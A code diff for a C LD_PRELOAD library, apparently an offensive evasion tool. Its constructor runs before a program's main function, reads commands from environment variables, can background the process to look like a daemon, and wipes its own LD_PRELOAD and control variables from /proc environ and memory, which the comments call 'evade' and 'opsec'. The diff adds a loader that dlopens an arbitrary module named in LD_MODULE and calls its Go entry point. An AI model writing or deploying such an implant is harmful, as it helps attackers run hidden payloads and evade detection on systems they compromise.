@@ -14,10 +14,15 @@
 #include <time.h>
 #include <fcntl.h>
 #include <stdarg.h>
-//#include <dlfcn.h>
+#include <dlfcn.h>
 
 #include "psevade.h"
 
+// define types needed for modules
+typedef long long go_int;
+typedef double go_float64;
+typedef struct{void *arr; go_int len; go_int cap;} go_slice;
+typedef struct{const char *p; go_int len;} go_str;
 
 
 // ------------------------------------------------------------------------- //
@@ -147,24 +152,24 @@ static void sig_handler(int signo)
   }
 }
 
-void cleanEnv(void){
+// Search and zeroize env variables we want to hide
+void cleanEnv(char* ldvar, int ldlen){
+
+	 // for some reson *env walk / memset does not rewind. Restart.
+	 lenvp = lenvp_start;
 
 	 // a. remove from /proc/pid/environ
 	 while (*lenvp) {
-      if (strncmp(*lenvp, "LD_PRELOAD=", 11) == 0)
+      if (strncmp(*lenvp, ldvar, ldlen) == 0){
         memset(*lenvp, 0, strlen(*lenvp));
-      if (strncmp(*lenvp, "LD_CMD=", 7) == 0)
-        memset(*lenvp, 0, strlen(*lenvp));
-      if (strncmp(*lenvp, "LD_BG=", 6) == 0)
-        memset(*lenvp, 0, strlen(*lenvp));
+		  break;
+		}
 
       lenvp++;
     }
-
+	 
 	 // b. remove from process memory if present to be sure
-	 unsetenv("LD_PRELOAD"); 
-	 unsetenv("LD_CMD"); 
-	 unsetenv("LD_BG"); 
+	 unsetenv(ldvar); 
 }
 
 void die(const char* format, ...){
@@ -233,7 +238,7 @@ int backgroundDaemonLeader(char * cmd_bg){
 }
 
 
-int processCommands(void){
+int processMetaCommands(void){
 
 	char *cmd=NULL, *key=NULL, *val=NULL;
 	int cmd_len, cmd_len_limit=128;
@@ -243,15 +248,15 @@ int processCommands(void){
    printf("%s: enter\n", __FUNCTION__);
 #endif 
 
-	if ( (cmd = (char*) getenv("LD_CMD")) == NULL ){
+	if ( (cmd = (char*) getenv("LD_PCMD")) == NULL ){
 #ifdef PSDEBUG
-		fprintf(stderr, "Invalid LD_CMD");
+		fprintf(stderr, "Invalid LD_PCMD");
 #endif 
 	   return 0;
 
 	}else{
 #ifdef PSDEBUG
-		printf("LD_CMD: %s\n", cmd);
+		printf("LD_PCMD: %s\n", cmd);
 #endif 
 
 		cmd = strdup(cmd); 
@@ -297,6 +302,67 @@ int processCommands(void){
 	return 1;
 }
 
+int doWork(void){
+	char * modload_t = NULL;
+	char * modload = NULL;
+	char * modload_args_t = NULL;
+	char * modload_args = NULL;
+	int    modload_args_len = 0;
+
+   void *handle = NULL;
+   char *error = NULL;
+
+	if ( (modload_t = (char*) getenv("LD_MODULE")) != NULL ){
+
+		// duplicate pointer before we reset env variable pointed by pointer
+		modload = strdup(modload_t);
+		if( access( modload, F_OK ) != -1 ) {
+
+
+		   // use dlopen to load shared object
+		   handle = dlopen (modload, RTLD_LAZY);
+		   if (!handle) {
+			  fputs (dlerror(), stderr);
+			  return(1);
+		   }
+
+		   // resolve Entry symbol
+		   go_int (*entry)(go_str) = dlsym(handle, "Entry");
+		   if ((error = dlerror()) != NULL)  {
+			  fputs(error, stderr);
+			  return(1);
+		   }
+
+    		//pass arguments along if any 
+			if ( (modload_args_t = (char*) getenv("LD_MODULE_ARGS")) != NULL ){ 
+				modload_args = strdup(modload_args_t);
+				modload_args_len = strlen(modload_args);	
+			}else{
+				modload_args = "noargs";
+				modload_args_len = strlen(modload_args);	
+			}
+
+			// cleanup opsec
+			cleanEnv("LD_MODULE_ARGS=", strlen("LD_MODULE_ARGS=") );
+			cleanEnv("LD_MODULE", strlen("LD_MODULE") );
+
+		   // call entry point
+			printf("modload args: %s (%d)\n", modload_args, modload_args_len);
+		   go_str msg = {modload_args, modload_args_len};
+
+		   entry(msg);
+		 
+		   // close file handle when done
+		   dlclose(handle);
+
+		} else {
+			printf("File %s cannot be accessed\n", modload);
+		}
+	}
+
+	return 0;
+
+}
 // Constructor called by ld.so before the main. This is not guaranteed but works.
 __attribute__((constructor)) static void _mctor(int argc, char **argv, char** envp)
 {
@@ -305,6 +371,7 @@ __attribute__((constructor)) static void _mctor(int argc, char **argv, char** en
 	 largv=argv;
 	 largc=argc;
 	 lenvp=envp;
+	 lenvp_start=envp;
 
 #ifdef PSDEBUG
 	 printf("pointer argv: %p\n", argv);
@@ -315,17 +382,25 @@ __attribute__((constructor)) static void _mctor(int argc, char **argv, char** en
 #endif
 
 	// register and setup 
-	processCommands();
+	processMetaCommands();
 
 	// We can even background the process so it can mimic daemons
 	char * bg_cmd=NULL;
 	if ( (bg_cmd = (char*) getenv("LD_BG")) != NULL )
 	 	backgroundDaemonLeader(bg_cmd);
 
-   // always evade: clean LD_PRELOAD pointers, LD_CMD
-	cleanEnv();
+   // always evade: clean LD_PRELOAD pointers, LD_PCMD
+	cleanEnv("LD_PRELOAD", strlen("LD_PRELOAD") );
+	cleanEnv("LD_PCMD", strlen("LD_PCMD") );
+	cleanEnv("LD_BG", strlen("LD_BG") );
+
+	// Do Work!
+	doWork();
 
 }
 
 // Destructor
 __attribute__((destructor)) static void _mdtor(void) { }
+
+
+
